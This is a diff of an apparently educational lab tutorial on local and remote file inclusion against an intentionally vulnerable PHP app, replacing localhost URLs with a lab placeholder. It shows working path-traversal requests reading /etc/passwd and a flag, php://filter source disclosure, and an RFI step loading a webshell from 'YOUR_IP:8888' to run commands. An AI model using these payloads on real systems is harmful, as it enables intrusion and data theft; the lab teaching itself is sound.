@@ -44,7 +44,10 @@ include($page);
 ```bash
 cd lfi-rfi/lab
 docker compose up -d
-# Lab at: http://localhost:7108
+
+> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.
+
+# Lab at: <LAB_ADDRESS>
 ```
 
 The lab is a news reader with a `page` parameter (loads files from `pages/`). Two flags: `/flag.txt` (read via LFI) and the webshell flag (via RFI).
@@ -54,7 +57,7 @@ The lab is a news reader with a `page` parameter (loads files from `pages/`). Tw
 ### Step 2: Browse normally
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=home"
+$ curl -s "<LAB_ADDRESS>/index.php?page=home"
 ( home page content )
 ```
 
@@ -63,7 +66,7 @@ $ curl -s "http://localhost:7108/index.php?page=home"
 ### Step 3: LFI read /etc/passwd
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=../../../../etc/passwd"
+$ curl -s "<LAB_ADDRESS>/index.php?page=../../../../etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ...
@@ -76,7 +79,7 @@ daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 ### Step 4: LFI read source code with php://filter
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-encode/resource=home.php"
+$ curl -s "<LAB_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home.php"
 PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4K...
 ```
 
@@ -84,7 +87,7 @@ PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4K...
 
 ```bash
 # Decode the base64 to get the source
-$ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-encode/resource=home.php" | base64 -d
+$ curl -s "<LAB_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home.php" | base64 -d
 ```
 
 > **Explain:** `php://filter` makes PHP read the **source code** and encode it as base64 (reading directly would execute the file first, so base64 lets you see the original code). From the source you find parameters, `include` calls, the directory layout... then read other files (`config.php`, `admin.php`).
@@ -92,7 +95,7 @@ $ curl -s "http://localhost:7108/index.php?page=php://filter/convert.base64-enco
 ### Step 5: Read the flag via LFI
 
 ```bash
-$ curl -s "http://localhost:7108/index.php?page=../../../../flag.txt"
+$ curl -s "<LAB_ADDRESS>/index.php?page=../../../../flag.txt"
 FLAG{l0c4l_f1l3_1ncl_2026}
 ```
 
@@ -106,10 +109,10 @@ FLAG{l0c4l_f1l3_1ncl_2026}
 #    and serve it:  python3 -m http.server 8888
 
 # 2. Load the remote file into the lab
-$ curl -s "http://localhost:7108/index.php?page=http://YOUR_IP:8888/shell.txt"
+$ curl -s "<LAB_ADDRESS>/index.php?page=http://YOUR_IP:8888/shell.txt"
 
 # 3. Run a remote command
-$ curl -s "http://localhost:7108/index.php?page=http://YOUR_IP:8888/shell.txt&cmd=id"
+$ curl -s "<LAB_ADDRESS>/index.php?page=http://YOUR_IP:8888/shell.txt&cmd=id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
